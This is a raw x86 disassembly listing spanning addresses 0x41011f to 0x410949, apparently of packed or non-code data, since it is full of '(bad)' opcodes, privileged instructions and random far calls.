  41011f:	mov    ch,BYTE PTR [edx+0x79]
  410122:	dec    ebp
  410123:	push   ecx
  410124:	mov    eax,0xa51a910
  410129:	ja     0x4100bd
  41012b:	ret    0xce66
  41012e:	mov    bl,ah
  410130:	mov    ds:0x188e3cd0,al
  410135:	pop    esp
  410136:	ins    BYTE PTR es:[edi],dx
  410137:	and    eax,0xb8fde1c6
  41013c:	les    esi,FWORD PTR [ecx-0x39]
  41013f:	retf   
  410140:	cmp    DWORD PTR [esi-0x5a535fe5],edx
  410146:	scas   eax,DWORD PTR es:[edi]
  410147:	std    
  410148:	scas   ax,WORD PTR es:[di]
  41014b:	mov    cs,WORD PTR [ecx+0x2343fd5c]
  410151:	test   al,0xfc
  410153:	lock jbe 0x4101cd
  410156:	out    0x67,al
  410158:	data16 xor al,0x15
  41015b:	add    DWORD PTR [esi],ebx
  41015d:	daa    
  41015e:	add    BYTE PTR [esi-0x5d],dl
  410161:	push   edx
  410162:	mov    bl,0xba
  410164:	xchg   ecx,eax
  410165:	mov    al,0x86
  410167:	fs jl  0x410147
  41016a:	add    DWORD PTR cs:[ebp+eax*8+0x7],ecx
  41016f:	jbe    0x410179
  410171:	push   ebp
  410172:	fsubp  st(7),st
  410174:	xor    eax,0xb4651568
  410179:	sahf   
  41017a:	xor    BYTE PTR [edx-0x5bb354c8],0xf6
  410181:	adc    BYTE PTR [ebx+0x18],0x86
  410185:	mov    eax,0x9620880b
  41018a:	mov    eax,0xcfbc4a59
  41018f:	push   ds
  410190:	in     eax,dx
  410191:	mov    ds:0xbf4f68db,al
  410196:	mov    esi,0x2b0e18e2
  41019b:	and    eax,0x4d104b74
  4101a0:	mov    ah,0x2d
  4101a2:	test   DWORD PTR [edx-0xa],edi
  4101a5:	fcomp  QWORD PTR [esi]
  4101a7:	pop    es
  4101a8:	in     al,0xfa
  4101aa:	xor    eax,DWORD PTR es:[esi+0x58]
  4101ae:	and    DWORD PTR [edi+0x2],ebx
  4101b1:	jb     0x4101bf
  4101b3:	xchg   ebx,eax
  4101b4:	sbb    al,0xe7
  4101b6:	pop    ds
  4101b7:	test   eax,0x964c37a3
  4101bc:	(bad)  
  4101bd:	jo     0x410183
  4101bf:	cmp    al,0x62
  4101c1:	or     ch,BYTE PTR [ecx-0x7d]
  4101c4:	setnp  BYTE PTR [ebx+ebp*8-0x43]
  4101c9:	ins    DWORD PTR es:[edi],dx
  4101ca:	arpl   WORD PTR [edi-0x50148eb6],di
  4101d0:	hlt    
  4101d1:	mov    cl,0x8d
  4101d3:	sbb    edx,edi
  4101d5:	out    dx,eax
  4101d6:	xchg   esp,eax
  4101d7:	adc    eax,0xe8f47bf2
  4101dc:	pop    ecx
  4101dd:	repnz test esp,ebx
  4101e0:	lock jne 0x4101b4
  4101e3:	outs   dx,DWORD PTR ds:[esi]
  4101e4:	or     DWORD PTR [ecx+0x4e],ebx
  4101e7:	cmp    DWORD PTR [esi],0xffffffbf
  4101ea:	test   eax,0xdb8720f5
  4101ef:	pop    ebp
  4101f0:	mov    BYTE PTR [esi-0x2b53127d],0x89
  4101f7:	or     al,0x58
  4101f9:	sti    
  4101fa:	fadd   st,st(0)
  4101fc:	icebp  
  4101fd:	gs adc dl,cl
  410200:	push   es
  410201:	lds    ebx,FWORD PTR [ebx-0x4c]
  410204:	dec    eax
  410205:	add    DWORD PTR [ebp+0x66],ebp
  410208:	xchg   ebx,eax
  410209:	add    DWORD PTR [ebp+0x6f64afa8],eax
  41020f:	or     esp,DWORD PTR [eax+edi*8-0x2b46fd8b]
  410216:	ins    DWORD PTR es:[edi],dx
  410217:	retf   
  410218:	cmp    al,0x3d
  41021a:	mov    ecx,0x37140a1c
  41021f:	in     eax,dx
  410220:	jmp    0x410275
  410222:	mov    al,ds:0xfd4a99a0
  410227:	jmp    0xf944dc2
  41022c:	xchg   esp,eax
  41022d:	push   edx
  41022e:	lods   eax,DWORD PTR ds:[esi]
  41022f:	mov    dh,0x1
  410231:	pop    esp
  410232:	retf   
  410233:	xor    DWORD PTR [eax-0x74],edi
  410236:	bound  eax,QWORD PTR [edi+ebx*1+0x55]
  41023a:	popf   
  41023b:	loope  0x410294
  41023d:	mov    bh,0xac
  41023f:	imul   ebx,DWORD PTR [eax+0x26456f8b],0x43
  410246:	mov    ah,0x79
  410248:	data16 jns 0x410290
  41024b:	out    dx,eax
  41024c:	pop    ds
  41024d:	out    dx,eax
  41024e:	(bad)  
  41024f:	clc    
  410250:	add    al,dh
  410252:	mov    ds:0xb6fbf5da,al
  410257:	add    DWORD PTR [ebp+0x638b4d58],eax
  41025d:	xchg   esp,eax
  41025e:	xchg   esp,eax
  41025f:	add    ecx,DWORD PTR [eax]
  410261:	xor    eax,0xea06c5fc
  410266:	ror    BYTE PTR [edx+0x602877b6],cl
  41026c:	inc    ebx
  41026d:	cmc    
  41026e:	mov    ds:0xaacd117f,eax
  410273:	cwde   
  410274:	int3   
  410275:	adc    al,BYTE PTR [eax+0x7548c872]
  41027b:	mov    ecx,DWORD PTR [ebp+0x39775666]
  410281:	sbb    al,0xce
  410283:	mov    ch,0x9f
  410285:	jno    0x4102da
  410287:	push   es
  410288:	ss xor eax,0x81f9d89
  41028e:	loop   0x41024a
  410290:	std    
  410291:	xor    DWORD PTR [ebx+eiz*8-0x2a927335],ebp
  410298:	push   cs
  410299:	cmc    
  41029a:	jb     0x4102ea
  41029c:	sbb    cl,bh
  41029e:	and    DWORD PTR [edx],edx
  4102a0:	mov    cl,0x66
  4102a2:	bnd jnp 0x410321
  4102a5:	loop   0x4102a9
  4102a7:	js     0x410281
  4102a9:	and    eax,0xb991acce
  4102ae:	xchg   esp,eax
  4102af:	sahf   
  4102b0:	ins    DWORD PTR es:[edi],dx
  4102b1:	cmp    DWORD PTR [edi],ebp
  4102b3:	xor    DWORD PTR [eax+eax*2+0x3a],edi
  4102b7:	fadd   DWORD PTR [ecx-0x5d6e7243]
  4102bd:	inc    edi
  4102be:	popa   
  4102bf:	(bad)  
  4102c0:	fiadd  DWORD PTR [eax+0x599804c6]
  4102c6:	cmp    ebp,DWORD PTR [edi]
  4102c8:	pushf  
  4102c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102ca:	add    ax,0x6829
  4102ce:	iret   
  4102cf:	xchg   cl,cl
  4102d1:	imul   ecx,edi,0x8c8597cc
  4102d7:	sti    
  4102d8:	scas   al,BYTE PTR es:[edi]
  4102d9:	cli    
  4102da:	fdiv   DWORD PTR [edx]
  4102dc:	mov    al,ds:0x79bf88f7
  4102e1:	dec    ebx
  4102e2:	(bad)  
  4102e3:	xchg   edi,eax
  4102e4:	inc    eax
  4102e5:	ret    0x6506
  4102e8:	ss ds into 
  4102eb:	dec    esi
  4102ec:	mov    ch,0x17
  4102ee:	sbb    ah,BYTE PTR [ebx+0x250f8c98]
  4102f4:	in     al,0x65
  4102f6:	in     al,dx
  4102f7:	bound  edx,QWORD PTR [edi]
  4102f9:	aad    0x47
  4102fb:	xor    eax,0xf4e69e54
  410300:	data16 hlt 
  410302:	adc    ecx,DWORD PTR [ebx+0x64]
  410305:	int3   
  410306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410307:	inc    ebp
  410308:	inc    edi
  410309:	adc    DWORD PTR [ecx+0x5ee6c261],ebx
  41030f:	sub    ebx,DWORD PTR [edx]
  410311:	push   ds
  410312:	aam    0xc2
  410314:	scas   al,BYTE PTR es:[edi]
  410315:	inc    edi
  410316:	mov    eax,0xc1c1031
  41031b:	push   0x54
  41031d:	into   
  41031e:	popf   
  41031f:	add    al,0x12
  410321:	adc    eax,0x2dc1e49f
  410326:	add    DWORD PTR [ebx],eax
  410328:	xchg   esp,eax
  410329:	mov    gs,WORD PTR [eax+0x41]
  41032c:	hlt    
  41032d:	dec    eax
  41032e:	jns    0xc376d0c3
  410334:	sbb    al,0x4b
  410336:	call   0x27a0:0x3bad3d69
  41033d:	rcr    eax,0x5d
  410340:	and    BYTE PTR [edx+eiz*1-0x69],ah
  410344:	and    eax,0xf6070a09
  410349:	dec    ebx
  41034a:	or     al,0x40
  41034c:	call   0xd3:0xf4f47835
  410353:	lods   eax,DWORD PTR ds:[esi]
  410354:	call   0x538c:0x9cd2919e
  41035b:	cs sbb al,0xcb
  41035e:	ret    0x6f04
  410361:	ins    BYTE PTR es:[edi],dx
  410362:	lahf   
  410363:	sar    BYTE PTR ds:0xca57d0f2,cl
  410369:	sahf   
  41036a:	ss (bad) 
  41036c:	lock in eax,dx
  41036e:	jns    0x41038d
  410370:	pusha  
  410371:	fld    TBYTE PTR [esi-0x2cfde2d8]
  410377:	sbb    BYTE PTR [ebp+0x33efbd38],dh
  41037d:	fild   DWORD PTR [ebx-0x4af70ca2]
  410383:	(bad)  
  410384:	call   0x531c87a2
  410389:	or     BYTE PTR [ebx-0x28a832d3],ch
  41038f:	sbb    al,0x8b
  410391:	inc    ecx
  410392:	mov    esp,0xdd967e23
  410397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410398:	outs   dx,DWORD PTR ds:[esi]
  410399:	add    al,0x13
  41039b:	sub    eax,0xe47f6b57
  4103a0:	pusha  
  4103a1:	hlt    
  4103a2:	aam    0xf2
  4103a4:	xor    ebp,ebp
  4103a6:	sub    BYTE PTR [edi+0x15519ebb],0x98
  4103ad:	imul   DWORD PTR [ebp-0xb]
  4103b0:	xor    al,0xa9
  4103b2:	sbb    DWORD PTR [eax+0x39769c2f],0x5c6b21e8
  4103bc:	mov    ebp,edx
  4103be:	and    cl,dl
  4103c0:	push   ebp
  4103c1:	or     eax,0x227f46a0
  4103c6:	cmp    al,0x3a
  4103c8:	lods   eax,DWORD PTR ds:[esi]
  4103c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103ca:	loopne 0x4103fb
  4103cc:	fcom   DWORD PTR [ebp+0x2faff00b]
  4103d2:	dec    ebp
  4103d3:	mov    esp,0xc8eede38
  4103d8:	cmp    BYTE PTR [edi-0x26390fe9],bh
  4103de:	mov    WORD PTR [edi*4-0x66848a87],ds
  4103e5:	mov    ds:0xf2424fa8,al
  4103ea:	retf   
  4103eb:	pusha  
  4103ec:	sbb    eax,0xb83c52a0
  4103f1:	pusha  
  4103f2:	mov    dh,0xc4
  4103f4:	sar    BYTE PTR ds:0x38afa54e,1
  4103fa:	dec    ecx
  4103fb:	jne    0x410380
  4103fd:	xor    eax,0xf7e03d4b
  410402:	and    BYTE PTR [eax*1-0x3932d819],0xa0
  41040a:	jle    0x41041b
  41040c:	sbb    al,0xb7
  41040e:	jae    0x4103ff
  410410:	pop    ecx
  410411:	dec    ecx
  410412:	and    BYTE PTR [ecx+0x27],dh
  410415:	adc    DWORD PTR [esp+esi*2+0x6129165d],esi
  41041c:	bound  edx,QWORD PTR [eax+ecx*1-0x6bc47f5b]
  410423:	loope  0x410424
  410425:	into   
  410426:	sub    eax,0x7f125b59
  41042b:	xchg   DWORD PTR [eax-0x2eaea9d1],ebx
  410431:	sahf   
  410432:	fwait
  410433:	imul   bh
  410435:	and    edi,0x59c5bfbf
  41043b:	push   eax
  41043c:	adc    BYTE PTR [esi],cl
  41043e:	mov    dh,0xc3
  410440:	xor    eax,0x7077a5b4
  410445:	push   ecx
  410446:	repnz pop edx
  410448:	and    DWORD PTR [edx+0xf],ebp
  41044b:	dec    DWORD PTR [edi+0x2]
  41044e:	dec    ebp
  41044f:	push   0x26
  410451:	push   ebp
  410452:	(bad)  
  410456:	add    BYTE PTR [eax-0x39],ch
  410459:	lock cwde 
  41045b:	mov    bl,0xdd
  41045d:	(bad)  
  41045f:	xor    DWORD PTR [ecx],0x2b
  410462:	add    ebp,DWORD PTR [edx-0x1a767ea5]
  410468:	or     al,0x24
  41046a:	push   ebx
  41046b:	or     esi,DWORD PTR [edi-0x243f1e8c]
  410471:	push   es
  410472:	enter  0x6a95,0xe
  410476:	mov    ds:0x90721003,al
  41047b:	lock xlat BYTE PTR ds:[ebx]
  41047d:	imul   esi,ebp,0x623db0e5
  410483:	jle    0x4104b3
  410485:	or     al,0x2d
  410487:	aaa    
  410488:	mov    dh,0xa3
  41048a:	or     al,0x1e
  41048c:	or     eax,0x4dee52d4
  410491:	cld    
  410492:	pop    ebx
  410493:	retf   0xaa5a
  410496:	jbe    0x410496
  410498:	xlat   BYTE PTR ds:[ebx]
  410499:	xor    esp,DWORD PTR [ebx-0x36610d1]
  41049f:	fs out dx,eax
  4104a1:	enterw 0xbdc4,0x77
  4104a6:	lock das 
  4104a8:	or     bl,BYTE PTR [esi-0x58]
  4104ab:	daa    
  4104ac:	mov    ds:0x212a3d64,al
  4104b1:	shr    BYTE PTR [edi+0x5b],cl
  4104b4:	fst    DWORD PTR [ebx-0x1a0a0a41]
  4104ba:	and    eax,0xdd478fed
  4104bf:	push   ecx
  4104c0:	test   DWORD PTR [esi+0x651cb5cd],edi
  4104c6:	or     ah,ch
  4104c8:	comiss xmm6,DWORD PTR [ebx]
  4104cb:	cmp    al,0x36
  4104cd:	xchg   BYTE PTR [ecx+0x19],bl
  4104d0:	inc    ebx
  4104d1:	sbb    eax,0xdc0b312c
  4104d6:	or     dh,BYTE PTR [edx]
  4104d8:	daa    
  4104d9:	leave  
  4104da:	test   eax,0xf2d5914b
  4104df:	call   0xef23a891
  4104e4:	sbb    eax,0x873b8301
  4104e9:	mov    dh,0x12
  4104eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104ec:	push   esi
  4104ed:	adc    bl,dh
  4104ef:	int    0x7f
  4104f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104f2:	or     edx,eax
  4104f4:	sbb    al,0xcc
  4104f6:	js     0x4104ea
  4104f8:	sbb    bh,BYTE PTR [ebx+0x66]
  4104fb:	ret    
  4104fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104fd:	dec    ebx
  4104fe:	sti    
  4104ff:	in     eax,0x6d
  410501:	inc    edx
  410502:	stos   DWORD PTR es:[edi],eax
  410503:	adc    ebp,DWORD PTR [eax]
  410505:	aam    0x53
  410507:	(bad)  
  410508:	idiv   BYTE PTR [ebx-0x61]
  41050b:	push   ss
  41050c:	shr    ebp,cl
  41050e:	jle    0x41054c
  410510:	mov    ds:0x61216dd2,al
  410515:	fwait
  410516:	aas    
  410517:	and    ch,0xb5
  41051a:	adc    BYTE PTR [esp+eax*8-0x332ad76b],bl
  410521:	ss push esp
  410523:	out    0xec,al
  410525:	push   eax
  410526:	mov    ah,0x1
  410528:	lods   eax,DWORD PTR ds:[esi]
  410529:	cmc    
  41052a:	into   
  41052b:	retf   
  41052c:	sub    eax,0xc7596bae
  410531:	pop    ecx
  410532:	mov    eax,ebx
  410534:	lods   eax,DWORD PTR ds:[esi]
  410535:	jmp    0x41055f
  410537:	inc    edx
  410538:	pop    eax
  410539:	cdq    
  41053a:	rcl    BYTE PTR [ebp-0x271ef7ca],1
  410540:	out    0x6a,al
  410542:	(bad)  
  410544:	mov    al,ds:0xd4e495fa
  410549:	ror    BYTE PTR [ebp+ebx*1-0xe7306d9],1
  410550:	push   ebx
  410551:	int3   
  410552:	mov    cl,BYTE PTR [ecx]
  410554:	mov    eax,0xed81ef9a
  410559:	cmp    eax,0xb6c18679
  41055e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41055f:	mov    ebx,0x6f5bc6f7
  410564:	leave  
  410565:	sahf   
  410566:	sub    dl,ah
  410568:	pop    eax
  410569:	neg    DWORD PTR [eax+0x7a]
  41056c:	push   esi
  41056d:	adc    BYTE PTR [eax+0x4448171a],ah
  410573:	cmp    al,0xc9
  410575:	mov    BYTE PTR es:[eax-0x116248bb],dl
  41057c:	jae    0x41059f
  41057e:	lods   al,BYTE PTR ds:[esi]
  41057f:	xchg   DWORD PTR ds:0xa65e9bd5,ebx
  410585:	retf   0x6cc7
  410588:	and    eax,0x786eeca4
  41058d:	ret    0xea6f
  410590:	arpl   cx,dx
  410592:	sbb    esi,esi
  410594:	repz leave 
  410596:	stc    
  410597:	cwde   
  410598:	jnp    0x410521
  41059a:	hlt    
  41059b:	mov    al,0x1a
  41059d:	(bad)  
  41059e:	jb     0x4105ad
  4105a0:	cdq    
  4105a1:	(bad)  
  4105a3:	pop    edx
  4105a4:	and    DWORD PTR [esi],ebp
  4105a6:	imul   ecx,DWORD PTR [edi+0x72],0x65cc5c56
  4105ad:	jmp    0xf27ad713
  4105b2:	mov    cl,BYTE PTR [edi]
  4105b4:	mov    eax,ds:0x120c647a
  4105b9:	push   ds
  4105ba:	xsha256 (bad)
  4105bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105bc:	aad    0xbd
  4105be:	pop    ss
  4105bf:	retf   
  4105c0:	shl    cl,0xa6
  4105c3:	cli    
  4105c4:	jno    0x41063c
  4105c6:	or     eax,0xabeb15bf
  4105cb:	iret   
  4105cc:	or     WORD PTR [edi+0x1],dx
  4105d0:	fisub  DWORD PTR [edi-0x1d338551]
  4105d6:	pop    es
  4105d7:	in     al,0x9d
  4105d9:	push   0x97a49062
  4105de:	outs   dx,BYTE PTR ds:[esi]
  4105df:	cmp    bh,BYTE PTR [eax+0x1b4215c1]
  4105e5:	mov    ebx,DWORD PTR [ebx+0x4d028f85]
  4105eb:	test   al,0xe9
  4105ed:	mov    edi,0x1841f06d
  4105f2:	mov    ecx,0xbc9a74cf
  4105f7:	cmp    dh,BYTE PTR [ebp-0x1a]
  4105fa:	mov    esp,0x9c5de6bb
  4105ff:	sahf   
  410600:	xlat   BYTE PTR ds:[ebx]
  410601:	mov    BYTE PTR [esi+ebx*1-0x275849ae],dl
  410608:	add    esp,DWORD PTR [ecx-0x7e]
  41060b:	cmc    
  41060c:	das    
  41060d:	push   ds
  41060e:	popf   
  41060f:	ret    0x66b9
  410612:	or     DWORD PTR [ebx+0x79c716d8],edi
  410618:	mov    al,ds:0xdf95ed19
  41061d:	mov    eax,ds:0xf294700a
  410622:	enter  0xe7fb,0x30
  410626:	outs   dx,BYTE PTR ds:[esi]
  410627:	or     al,0xce
  410629:	mov    ebp,0x33c11d81
  41062e:	out    0x8,eax
  410630:	outs   dx,DWORD PTR ds:[esi]
  410631:	xlat   BYTE PTR ds:[bx]
  410633:	dec    ecx
  410634:	in     al,dx
  410635:	sbb    al,0xb3
  410637:	in     eax,dx
  410638:	xor    edi,DWORD PTR ds:0xe65cc58f
  41063e:	test   al,0x25
  410640:	and    eax,0x408f1e7f
  410645:	cdq    
  410646:	(bad)  
  410647:	sti    
  410648:	jae    0x410625
  41064a:	rcr    BYTE PTR [esi+0x452aacd6],1
  410650:	push   ebx
  410651:	ror    ecx,1
  410653:	les    ebp,FWORD PTR [ebx]
  410655:	adc    esp,DWORD PTR [eax-0x1f]
  410658:	in     al,0x12
  41065a:	sub    BYTE PTR [esi-0x53],dl
  41065d:	out    dx,al
  41065e:	jle    0x4106c0
  410660:	out    0xe2,eax
  410662:	hlt    
  410663:	mov    ds:0xd5019f2f,al
  410668:	inc    ecx
  410669:	in     al,0xf9
  41066b:	(bad)  
  41066d:	repnz sbb BYTE PTR [edi+0x48f5649d],dl
  410674:	xor    eax,0xe797855e
  410679:	mov    edi,0x4fc741fd
  41067e:	push   esi
  41067f:	imul   esp,DWORD PTR ds:0x5d654ff0,0xfffffffd
  410686:	xrelease xchg DWORD PTR [edi],edi
  410689:	xchg   edi,eax
  41068a:	pop    ecx
  41068b:	pop    ebp
  41068c:	add    ebp,ebx
  41068e:	inc    ebp
  41068f:	cwde   
  410690:	jg     0x41061d
  410692:	mov    cl,0xd6
  410694:	popf   
  410695:	add    BYTE PTR [esi-0xb081443],ah
  41069b:	lods   eax,DWORD PTR ds:[esi]
  41069c:	push   0x18
  41069e:	push   ebp
  41069f:	jecxz  0x410710
  4106a1:	loope  0x410686
  4106a3:	rcr    ch,0xf4
  4106a6:	(bad)  
  4106a8:	adc    dl,cl
  4106aa:	pop    esp
  4106ab:	xchg   esp,eax
  4106ac:	rcl    DWORD PTR [eax],cl
  4106ae:	push   edi
  4106af:	repz xor al,0x41
  4106b2:	xchg   ecx,eax
  4106b3:	pop    eax
  4106b4:	and    ecx,DWORD PTR [ebp-0x4153b587]
  4106ba:	add    DWORD PTR [esp+ebp*4+0x7bb658a2],esp
  4106c1:	push   eax
  4106c2:	out    dx,eax
  4106c3:	adc    DWORD PTR [esi],0x426e5b4f
  4106c9:	sub    BYTE PTR [edi],ch
  4106cb:	ror    DWORD PTR [edi+0x53],cl
  4106ce:	pop    ds
  4106cf:	hlt    
  4106d0:	adc    ecx,esi
  4106d2:	dec    BYTE PTR [ecx]
  4106d4:	xor    BYTE PTR ss:[eax-0xa],al
  4106d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106d9:	popa   
  4106da:	xor    esp,DWORD PTR [edi]
  4106dc:	lock dec ecx
  4106de:	out    0x20,al
  4106e0:	mov    al,ds:0x2ddb42ca
  4106e5:	ret    
  4106e6:	lock pop ebx
  4106e8:	(bad)  
  4106e9:	pop    ecx
  4106ea:	scas   al,BYTE PTR es:[edi]
  4106eb:	jbe    0x41069a
  4106ed:	cmp    dh,bl
  4106ef:	pop    edi
  4106f0:	call   0xd787:0xa0a3a2e4
  4106f7:	jl     0x410749
  4106f9:	scas   eax,DWORD PTR es:[edi]
  4106fa:	in     al,dx
  4106fb:	pop    esi
  4106fc:	test   BYTE PTR [ebx],ah
  4106fe:	imul   esp,DWORD PTR [ebp+0x2c2b8a46],0x898fa416
  410708:	sub    ecx,ebp
  41070a:	out    dx,eax
  41070b:	dec    BYTE PTR [ebp+0x5c]
  41070e:	cmp    BYTE PTR [ebp+0x71],dl
  410711:	fistp  WORD PTR [edi]
  410713:	jnp    0x4106c3
  410715:	xlat   BYTE PTR ds:[ebx]
  410716:	je     0x410698
  410718:	jno    0x4106ad
  41071a:	mov    dh,0x86
  41071c:	xchg   ebp,eax
  41071d:	adc    eax,0xd4d9d366
  410722:	sbb    eax,0x70dfbdac
  410727:	dec    esp
  410728:	sbb    BYTE PTR [edi-0xfe0589b],cl
  41072e:	mov    dh,0x20
  410730:	leave  
  410731:	add    eax,0x766b1006
  410736:	adc    cl,BYTE PTR [ebp-0x23]
  410739:	push   esp
  41073a:	(bad)  [edx]
  41073c:	sub    al,0xe0
  41073e:	sub    eax,0x54f27e44
  410743:	jnp    0x4106ed
  410745:	(bad)  
  410746:	call   0x7f661a84
  41074b:	inc    ebp
  41074c:	adc    ch,dh
  41074e:	or     dl,BYTE PTR [eax+eiz*1]
  410751:	lock cmp eax,0x123ba0d
  410757:	(bad)  
  410758:	push   ss
  410759:	mov    esp,0xd3995d67
  41075e:	int3   
  41075f:	enter  0xa136,0xcf
  410763:	icebp  
  410764:	stos   BYTE PTR es:[edi],al
  410765:	jle    0x410721
  410767:	fstp   QWORD PTR [esi+0x25f5b397]
  41076d:	fdivr  DWORD PTR [ebx+0x5ed2eede]
  410773:	add    eax,0xc88603e6
  410778:	push   ecx
  410779:	mov    bl,0xc7
  41077b:	test   BYTE PTR [edi+edi*8+0x36],bl
  41077f:	sahf   
  410780:	(bad)  
  410782:	imul   BYTE PTR [eax]
  410784:	repz scas eax,DWORD PTR es:[edi]
  410786:	xor    al,0xaa
  410788:	inc    ecx
  410789:	ds or  eax,0x64b60dd3
  41078f:	push   0x384ddb6
  410794:	cmp    dl,BYTE PTR [edx-0x1d96eb57]
  41079a:	inc    esi
  41079b:	js     0x410793
  41079d:	and    esi,DWORD PTR [ecx+0x3c9bcf5e]
  4107a3:	jmp    0x41074a
  4107a5:	inc    ebx
  4107a6:	mov    ds:0x23923727,eax
  4107ab:	adc    ebp,DWORD PTR [esi]
  4107ad:	and    BYTE PTR [eax+0x6b9f6e56],dh
  4107b3:	jae    0x410782
  4107b5:	push   esi
  4107b6:	add    al,0x8a
  4107b8:	and    al,0x57
  4107ba:	je     0x41079c
  4107bc:	cs add edx,0x47
  4107c0:	retf   
  4107c1:	push   ebp
  4107c2:	dec    edi
  4107c3:	cdq    
  4107c4:	mov    ebp,0x86fd0852
  4107c9:	in     al,dx
  4107ca:	loop   0x410750
  4107cc:	sub    cl,cl
  4107ce:	pop    ss
  4107cf:	sahf   
  4107d0:	test   al,0xc5
  4107d2:	inc    edx
  4107d3:	add    esi,DWORD PTR [edx+0x7ce05d19]
  4107d9:	inc    edi
  4107da:	out    dx,al
  4107db:	outs   dx,DWORD PTR ds:[esi]
  4107dc:	dec    ebx
  4107dd:	adc    edx,ebx
  4107df:	add    BYTE PTR [eax-0x54],cl
  4107e2:	cdq    
  4107e3:	test   eax,0x2e1fef95
  4107e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107e9:	push   ebp
  4107ea:	pop    ebp
  4107eb:	adc    ebp,DWORD PTR [ecx-0x35279ba3]
  4107f1:	xor    BYTE PTR [edi],bh
  4107f3:	data16 and dl,dl
  4107f6:	in     al,0x17
  4107f8:	setne  dh
  4107fb:	mov    ecx,0x768e9d50
  410800:	push   ebx
  410801:	mov    cl,0x6c
  410803:	or     DWORD PTR [ecx+0x6cfdbc93],eax
  410809:	mov    eax,DWORD PTR [ecx+0x730d7da5]
  41080f:	push   0xffffffdd
  410811:	cmp    eax,0xed9e1afd
  410816:	add    BYTE PTR [esi-0x54a0702b],0x2e
  41081d:	or     bl,cl
  41081f:	lock jmp 0x745cb496
  410825:	mov    ebp,0xca866b24
  41082a:	mov    DWORD PTR [ebp+0x63a3095],eax
  410830:	rol    cl,1
  410832:	xchg   esp,eax
  410833:	mov    ecx,0x69fb6dff
  410838:	xchg   edx,eax
  410839:	mov    edi,0x51975a0b
  41083e:	jb     0x4108ba
  410840:	mov    ds:0x15fd3612,eax
  410845:	addr16 lahf 
  410847:	ficomp DWORD PTR [ebp+esi*4+0x5dddbd49]
  41084e:	ss or  al,dh
  410851:	push   0x1ad0ece
  410856:	xlat   BYTE PTR ds:[ebx]
  410857:	popf   
  410858:	push   ecx
  410859:	je     0x4108d5
  41085b:	push   ecx
  41085c:	test   ah,bh
  41085e:	(bad)  
  41085f:	in     al,0x8d
  410861:	mov    eax,0x1706952f
  410866:	retf   0x3876
  410869:	xchg   ecx,eax
  41086a:	loope  0x4108bd
  41086c:	js     0x410885
  41086e:	fwait
  41086f:	aam    0x3
  410871:	xchg   bh,dh
  410873:	sub    ebx,DWORD PTR [ecx+0xa0d328d]
  410879:	repz sbb BYTE PTR [edx],ah
  41087c:	repz ja 0x410899
  41087f:	sub    al,BYTE PTR [edx]
  410881:	cld    
  410882:	mov    cl,0x9e
  410884:	and    al,0xa1
  410886:	scas   al,BYTE PTR es:[edi]
  410887:	out    dx,eax
  410888:	pop    esp
  410889:	pop    es
  41088a:	pop    eax
  41088b:	sub    al,0xda
  41088d:	inc    eax
  41088e:	sbb    cl,BYTE PTR [edi]
  410890:	and    DWORD PTR [eax-0x22],esi
  410893:	xor    DWORD PTR [ebx],ecx
  410895:	sbb    al,0xf9
  410897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410898:	sbb    BYTE PTR [ebp-0x3b],cl
  41089b:	jbe    0x410826
  41089d:	iret   
  41089e:	cmp    al,0xe9
  4108a0:	mov    al,ds:0x90bcadd6
  4108a5:	and    al,0x10
  4108a7:	dec    ecx
  4108a8:	loop   0x41090d
  4108aa:	imul   esp,DWORD PTR [esi],0x3
  4108ad:	sbb    al,0xc7
  4108af:	jae    0x410922
  4108b1:	mov    dh,0x8f
  4108b3:	test   al,0xa3
  4108b6:	fld    TBYTE PTR [esi-0x159e9ee5]
  4108bc:	push   0x3e
  4108be:	or     al,0x2c
  4108c0:	add    BYTE PTR [ebx-0x5e],dl
  4108c3:	aad    0x22
  4108c5:	js     0x410880
  4108c7:	sahf   
  4108c8:	mov    dl,ch
  4108ca:	xchg   BYTE PTR [ecx-0x7a],bl
  4108cd:	sub    bh,bh
  4108cf:	cdq    
  4108d0:	pop    ecx
  4108d1:	xchg   ebx,ebx
  4108d3:	cmp    dl,BYTE PTR [ecx+0x1e]
  4108d6:	pop    esp
  4108d7:	mov    al,0xd9
  4108d9:	dec    ebp
  4108da:	xchg   esi,eax
  4108db:	out    0xcc,al
  4108dd:	je     0x4108b7
  4108df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108e0:	mov    edi,0xa63f1e72
  4108e5:	je     0x410873
  4108e7:	mov    al,ds:0x7c48a5be
  4108ec:	xchg   bh,ah
  4108ee:	push   edx
  4108ef:	gs repz push es
  4108f2:	push   0x10493fe3
  4108f7:	(bad)  
  4108f8:	push   ebp
  4108f9:	lea    edx,[edi]
  4108fb:	or     dl,BYTE PTR [eax+0x2940c005]
  410901:	pop    edx
  410902:	inc    eax
  410903:	jmp    0x5ca82eac
  410908:	adc    BYTE PTR [edx-0x58],ch
  41090b:	mov    ds:0x24ccf148,eax
  410910:	nop    DWORD PTR [esi-0x7c]
  410914:	sub    edx,DWORD PTR [esi]
  410916:	push   ebp
  410917:	jmp    0x6d9b:0x4e09db01
  41091e:	ins    BYTE PTR es:[edi],dx
  41091f:	pusha  
  410920:	sbb    al,0x6f
  410922:	lock lds esp,FWORD PTR [eax+0x37]
  410926:	popa   
  410927:	pop    ebx
  410928:	xor    bh,bh
  41092a:	mov    esp,0x6d6f7242
  41092f:	retf   0x6e20
  410932:	xchg   edi,eax
  410933:	push   ss
  410934:	div    ebp
  410936:	imul   ebp,DWORD PTR [ebx],0x4fbc5938
  41093c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41093d:	(bad)  
  41093e:	ror    BYTE PTR [ebx+edx*2-0x2f9af400],cl
  410945:	adc    esp,DWORD PTR [ecx+eiz*4+0x59]
  410949:	das    
